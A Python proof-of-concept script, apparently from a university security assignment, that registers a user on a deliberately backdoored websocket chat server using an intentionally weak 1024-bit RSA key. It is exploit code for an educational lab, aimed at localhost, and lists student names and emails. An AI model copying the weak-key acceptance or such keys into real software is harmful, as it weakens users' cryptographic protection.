#!/usr/bin/env python3
"""
PoC: register a user using a deliberately weak RSA-1024 public key.

Precondition:
- Your vulnerable server must include the "weak key acceptance" backdoor
  (der_b64url_to_public_pem allows weak keys) OR you started the server
  with BACKDOOR_WEAK_KEYS=1 and the server accepts such keys at registration.

Usage:
  python3 quarantine/poc_weak_key_register.py --host 127.0.0.1 --port 8765

What it does:
- Generates a 1024-bit RSA keypair (in-memory)
- Encodes the public key as DER + base64url (no padding)
- Crafts a USER_HELLO message (with a fresh UUID v4)
- Sends the USER_HELLO to the server websocket and prints any reply

Author: GROUP 12
MEMBERS:  
  1. Debasish Saha Pranta (a1963099, debasishsaha.pranta@student.adelaide.edu.au)
  2. Samin Yeasar Seaum (a1976022, saminyeasar.seaum@student.adelaide.edu.au)
  3. Abidul Kabir (a1974976, abidul.kabir@student.adelaide.edu.au)
  4. Sahar Alzahrani (a1938372, sahar.alzahrani@student.adelaide.edu.au)
  5. Mahrin Mahia (a1957342, mahrin.mahia@student.adelaide.edu.au)
  6. Maria Hasan Logno (a1975478, mariahasan.logno@student.adelaide.edu.au)
"""

import asyncio
import argparse
import json
import uuid
import base64
import time
from websockets import connect

# cryptography imports
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

def b64url_encode(data: bytes) -> str:
    enc = base64.urlsafe_b64encode(data).rstrip(b"=")
    return enc.decode("ascii")

def make_1024_key_der_b64url():
    # generate a 1024-bit RSA key (INTENTIONAL WEAK KEY for PoC)
    key = rsa.generate_private_key(public_exponent=65537, key_size=1024)
    pub = key.public_key()
    der = pub.public_bytes(encoding=serialization.Encoding.DER,
                           format=serialization.PublicFormat.SubjectPublicKeyInfo)
    return b64url_encode(der), key  # return (pub_der_b64url, private_key_obj)

async def send_user_hello(host, port, server_id=None):
    uri = f"ws://{host}:{port}"
    pub_der_b64u, _priv = make_1024_key_der_b64url()
    user_uuid = str(uuid.uuid4())

    msg = {
        "type": "USER_HELLO",
        "from": user_uuid,
        "to": "*",
        "id": uuid.uuid4().hex,
        "ts": int(time.time() * 1000),
        "payload": {
            "pubkey_b64u": pub_der_b64u,
            "name": "poc_weak_key_user"
        }
    }
    # No transport 'sig' required for a plain USER_HELLO from client -> server in this code path
    print("Connecting to", uri)
    try:
        async with connect(uri) as ws:
            print("Connected. Sending USER_HELLO with 1024-bit key...")
            await ws.send(json.dumps(msg))
            # Await a response (either server accepts with adverts or sends ERROR)
            # Wait up to a few seconds (server may also send USER_ADVERTISE frames afterwards)
            try:
                for _ in range(6):
                    raw = await asyncio.wait_for(ws.recv(), timeout=2)
                    print("<< received:", raw)
            except asyncio.TimeoutError:
                print("No immediate reply received (server may have accepted silently).")
    except Exception as e:
        print("Connection failed:", e)

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", default=8765, type=int)
    args = p.parse_args()
    asyncio.run(send_user_hello(args.host, args.port))
